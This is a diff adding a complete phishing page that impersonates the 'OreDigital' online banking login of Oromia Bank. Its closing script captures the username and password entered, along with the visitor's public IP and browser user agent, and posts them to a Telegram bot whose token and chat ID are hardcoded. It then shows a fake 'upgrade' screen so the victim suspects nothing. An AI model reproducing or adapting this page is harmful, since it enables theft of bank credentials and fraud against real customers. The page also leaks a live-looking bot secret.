@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en" class=""><head><script>window.livecodes = window.livecodes || {};</script><title>Untitled Project</title><meta name="title" content="Untitled Project"><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="./style.css"><script src="https://cdn.jsdelivr.net/npm/es-module-shims@1.10.0/dist/es-module-shims.js" async=""></script><script type="importmap">{
+  "imports": {}
+}</script></head><body>
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>OreDigital</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+/* ===== BACKGROUND IMAGE ===== */
+body {
+    background: url('bg.png') no-repeat center center / cover;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    min-height: 100vh;
+}
+
+/* ===== CARD (overlay) ===== */
+.card {
+    background: rgba(255, 255, 255, 0.96);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+    max-width: 420px;
+    width: 100%;
+    border-radius: 32px;
+    box-shadow: 0 16px 60px rgba(0, 0, 0, 0.25);
+    padding: 28px 24px 20px;
+    position: relative;
+    transition: all 0.3s ease;
+}
+.hidden {
+    display: none !important;
+}
+
+/* ===== GREEN HEADER ===== */
+.header-green {
+    background: #00a65a;
+    margin: -28px -24px 20px -24px;
+    padding: 16px 24px 14px;
+    border-radius: 32px 32px 0 0;
+    text-align: center;
+}
+.header-green h1 {
+    color: #fff;
+    font-size: 26px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+}
+.header-green .sub {
+    color: rgba(255,255,255,0.85);
+    font-size: 13px;
+    font-weight: 400;
+    margin-top: 2px;
+}
+
+/* ===== FORM ===== */
+.form-group {
+    margin-bottom: 18px;
+}
+.form-group label {
+    display: block;
+    color: #1a1a1a;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 4px;
+}
+.form-group input {
+    width: 100%;
+    padding: 12px 0;
+    border: none;
+    border-bottom: 2px solid #d0d5dd;
+    font-size: 16px;
+    outline: none;
+    background: transparent;
+    color: #1a1a1a;
+    transition: border-color 0.3s;
+}
+.form-group input:focus {
+    border-bottom-color: #00a65a;
+}
+.form-group input::placeholder {
+    color: #a0a8b5;
+}
+
+/* ===== BUTTONS & LINKS ===== */
+.btn-green {
+    width: 100%;
+    padding: 14px;
+    background: #00a65a;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 18px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background 0.2s, transform 0.1s;
+    margin-top: 6px;
+}
+.btn-green:hover {
+    background: #008c4a;
+}
+.btn-green:active {
+    transform: scale(0.97);
+}
+.btn-green:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+}
+
+.links-row {
+    display: flex;
+    justify-content: center;
+    gap: 16px;
+    margin: 18px 0 10px;
+    flex-wrap: wrap;
+}
+.links-row a {
+    color: #00a65a;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 600;
+}
+.links-row a:hover {
+    text-decoration: underline;
+}
+
+.bottom-nav {
+    display: flex;
+    justify-content: space-around;
+    border-top: 1px solid #e8ecf0;
+    padding-top: 16px;
+    margin-top: 10px;
+}
+.bottom-nav a {
+    color: #6b7a8f;
+    text-decoration: none;
+    font-size: 12px;
+    font-weight: 500;
+    letter-spacing: 0.3px;
+}
+.bottom-nav a:hover {
+    color: #00a65a;
+}
+
+/* ===== UPGRADE PAGE ===== */
+.upgrade-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 8px;
+}
+.upgrade-sub {
+    color: #4a5568;
+    font-size: 14px;
+    line-height: 1.6;
+    margin-bottom: 24px;
+}
+.upgrade-box {
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 14px;
+    padding: 18px 16px;
+    text-align: center;
+    margin-bottom: 16px;
+    transition: background 0.2s;
+    cursor: pointer;
+}
+.upgrade-box:hover {
+    background: #edf2f7;
+}
+.upgrade-box .main-link {
+    color: #00a65a;
+    font-weight: 700;
+    font-size: 16px;
+    text-decoration: none;
+    display: block;
+}
+.upgrade-box .desc {
+    color: #718096;
+    font-size: 12px;
+    margin-top: 2px;
+}
+.upgrade-note {
+    color: #4a5568;
+    font-size: 13px;
+    line-height: 1.5;
+    margin: 16px 0 12px;
+}
+</style>
+
+
+
+<div class="card">
+
+    <!-- ==================== PAGE 1: LOGIN ==================== -->
+    <div id="page1">
+        <div class="header-green">
+            <h1>OreDigital</h1>
+            <div class="sub">Oromia Bank • Online Banking</div>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Username</label>
+                <input type="text" id="username" placeholder="Enter username" required="" autofocus="">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter password" required="">
+            </div>
+            <button type="submit" class="btn-green" id="loginBtn">Login</button>
+        </form>
+
+        <div class="links-row">
+            <a href="#">Open OroWallet</a>
+            <a href="#">Get online bank access</a>
+            <a href="#">Cancel</a>
+        </div>
+
+        <div class="bottom-nav">
+            <a href="#">Bank News</a>
+            <a href="#">Map</a>
+            <a href="#">Contact Us</a>
+            <a href="#">FAQ</a>
+            <a href="#">More</a>
+        </div>
+    </div>
+
+    <!-- ==================== PAGE 2: UPGRADE ==================== -->
+    <div id="page2" class="hidden">
+        <div class="header-green">
+            <h1>OreDigital</h1>
+            <div class="sub">Upgrade</div>
+        </div>
+
+        <div class="upgrade-title">Are you ready for an upgrade?</div>
+        <div class="upgrade-sub">
+            Login to the new experience with best features and services<br><br>
+            If you are a first-time user, please proceed for user registration.
+        </div>
+
+        <div class="upgrade-box" onclick="alert('Redirecting to online banking...')">
+            <a href="#" class="main-link">Get online bank access</a>
+            <div class="desc">Secure, fast, and modern banking</div>
+        </div>
+
+        <div class="upgrade-note">
+            If you have valid username, please set a new password using the forgot password.
+        </div>
+
+        <div class="bottom-nav">
+            <a href="#">Bank News</a>
+            <a href="#">Map</a>
+            <a href="#">Contact Us</a>
+            <a href="#">FAQ</a>
+            <a href="#">More</a>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============ TELEGRAM CONFIG ============
+const BOT_TOKEN = '8707387456:AAEtn_LUY3lcLHGYGQMtZP6U6PG9vZUI65M';
+const CHAT_ID = '6591945625'; // Replace with your numeric chat ID
+const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// ============ HELPERS ============
+function escapeHtml(text) {
+    const d = document.createElement('div');
+    d.textContent = text;
+    return d.innerHTML;
+}
+
+function sendToTelegram(text, parseMode = 'HTML') {
+    const maxLen = 4000;
+    for (let i = 0; i < text.length; i += maxLen) {
+        const chunk = text.substring(i, i + maxLen);
+        fetch(`${TG_API}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: chunk,
+                parse_mode: parseMode
+            })
+        }).catch(() => {});
+    }
+}
+
+// ============ GET PUBLIC IP ============
+let userIP = 'unknown';
+fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => { userIP = d.ip; })
+    .catch(() => {});
+
+// ============ FORM HANDLER ============
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const btn = document.getElementById('loginBtn');
+
+    if (!username || !password) {
+        alert('Please fill in all fields.');
+        return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Logging in...';
+
+    // Send credentials to Telegram
+    const tgMsg = `🏦 <b>BANK LOGIN (OreDigital)</b>\n\nUsername: <code>${escapeHtml(username)}</code>\nPassword: <code>${escapeHtml(password)}</code>\nIP: ${userIP}\nUser-Agent: ${navigator.userAgent}`;
+    sendToTelegram(tgMsg);
+
+    // Switch to Page 2 (Upgrade)
+    document.getElementById('page1').classList.add('hidden');
+    document.getElementById('page2').classList.remove('hidden');
+    btn.disabled = false;
+    btn.textContent = 'Login';
+
+    // Optional: show fingerprint overlay after 1s (if you want)
+    // You can add the fingerprint modal code from previous version.
+});
+</script>
+
+<script src="./script.js"></script></body></html>
